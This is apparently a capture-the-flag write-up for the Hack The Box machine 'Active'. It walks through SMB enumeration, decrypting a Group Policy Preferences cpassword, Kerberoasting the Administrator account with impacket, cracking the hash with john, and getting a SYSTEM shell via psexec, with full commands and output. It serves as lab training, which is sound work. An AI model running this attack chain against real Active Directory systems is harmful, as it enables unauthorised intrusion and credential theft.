# Active-HTB
Active is a Windows machine that is rated as easy. What you can learn from this box is how to gain privileges within an Active Directory environment.

# Recon
We start with nmap scan on the box.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ nmap -sC -sV 10.10.10.100 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 12:55 EDT
Nmap scan report for 10.10.10.100
Host is up (0.034s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-13 16:58:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m51s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-13T16:59:09
|_  start_date: 2020-09-13T16:48:29

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.54 seconds

```

## Enumerate SMB

Let's start first with ```enum4linux``` some of the important results is this:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ sudo enum4linux -a 10.10.10.100
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep 13 13:03:49 2020

 ========================================= 
|    Share Enumeration on 10.10.10.100    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$     Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication      Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Users    Mapping: DENIED, Listing: N/A
```
The ```Share Enumeration``` section show some important information about ```Replication``` we can verfiy this by using ```smbmap```:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ smbmap -H 10.10.10.100      
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```
We have Read access on ```Replication```. Let's connect to it using ```smbclient```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ smbclient //10.10.10.100/Replication -U ""%""                                                                                                                                                                                    130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 4925551 blocks available
```
After some searching in ```active.htb``` files I found this file:
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                10459647 blocks of size 4096. 4925551 blocks available
```
Download it:
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
```
It contain a username and a cpassword:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We can decrypt the password using ```gpp-decrypt```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                                                                                                               130 ⨯
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```
So the password is ```GPPstillStandingStrong2k18```. Now we access to the other shares:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

# User Flag
Let's now connect to Users share:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \>
```
And we can get the user flag:
```
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

                10459647 blocks of size 4096. 4925551 blocks available
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ cat user.txt  
86d67d8b...4d10159e983
```

# Root Flag

So for this step I will be using one of impacket scripts ```GetUserSPNs.py```:
```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 ACTIVE.HTB/SVC_TGS                                                                                                                                                           130 ⨯
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$00ee89bce58c5eba988419a160538518$15b57a053f98c048f45317dae96e8bc333ae42361425f204943ab4618b4d7e55b07e236a518a6fb93066bbc5bb7a3abf8b1fdf742fc3fce4f6d7077f72fd55f422ac51ed2cf630d7c891fc9f6b007406f4af9872eeaf7b30193ee6e18fc539c29322d8430c95876156b7b768e46b6c80201caab095f3a02f6922bb0fb4d86877cf5a9e6e6d7d5be387d548d00cd2a18db477887977238aa1fcab7b33ac5b88aa7957204da02c715a34b8defa241eefb3add19462931ebb539b068df43aa755510b17a09f4f660fca72c893aa9996ef41a59fee6a8e1a88c5726a5c53108936b875eaeeeaf6c79a8b450873ee92c19b20fb5ae8516ec15505c380410502b836fc7df87a749f1eb8b371fbebed16577f1ff7d148df557f4da28a202b305f644550a299d751b90e2fb942b1e6c66dacf6b490ec147a5de997b7c89c15b7bc98736c09c5bc83802fd14df994b7c6883e7502e080ca50cb8bc89ea29e3115760686a6355fb2c8bbf5f0410a4058c254a575aa66e28b7ee1f9f2054b3beed56aaf70e276e41a8ea63e17312fb8ea0c72de44beddf041ee109fce662fa4d34a7ddfdb5c5d556af31110ca28984c077a7838a092fd5729c01bdcb3ed9454511a3a2b23e1d7cbd0d3d84d390e820069ee098bf59abadbf4c23c10eb2995413eec6f74094d187e9e0bbc0daa02e9818632927f0c853eccd7a9af7fc08ffe1f001dd7cb616ff8cf7afbf0590b3e6a4b092469ce3beaf895cf9fe301a33cbadaf039646cc41d0c9cc758914b552365789484b64bce34aab4bcfcfa8b8fdd560c91d16bd654fc9d8236bcdbe3bbf1039443baeed73563ec796c9738bf5c431da507bccbd25cbb91316a733b97213a1baa0b2e9f4acb84512da95c3c9ceda54d8e503a1aeac895528769cb399063a54dd0d410180f4134288babf18d96c590f95c1122ea52de8639c522f0569d162e14e044881f5f100305975caedec83ffedd29e5dfcb1f5d6fc8895b947cf6ef613587f95e001cb59d10eddfe146718a0d3cffa62bacd427f3745e9c791a6dee21a4598eaf5f77a7501a9bbd0179da3d49a7d93970c48a37a504fa08777250dc8e56bbe02ae39c3d9b9b49c858199ccce0c524280d50865116c9647d81861273875bddaf01742c264c7c9951d188a0695d498204420626915adbb8ef7f4e5d55c5403d6ad95cd9b1dc4b238ca01ed1c24a0caa8879b38786a1b3ba2a6c9b76ce43ab3c6145eda2964dd4d366409fd4309274ec
```

We can crack the hash now with ```john```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt crackme
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2020-09-13 14:41) 0.1672g/s 1762Kp/s 1762Kc/s 1762KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
So now we have ```administrator``` password. We can use now psexec.py to get a shell as ```System```:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Active]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py active.htb/administrator@10.10.10.100
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file EuugjCua.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service uffN on 10.10.10.100.....
[*] Starting service uffN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

And now get the root flag:
```
C:\Users\Administrator\Desktop>type root.txt
b5fc76d1...4d0f708b
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
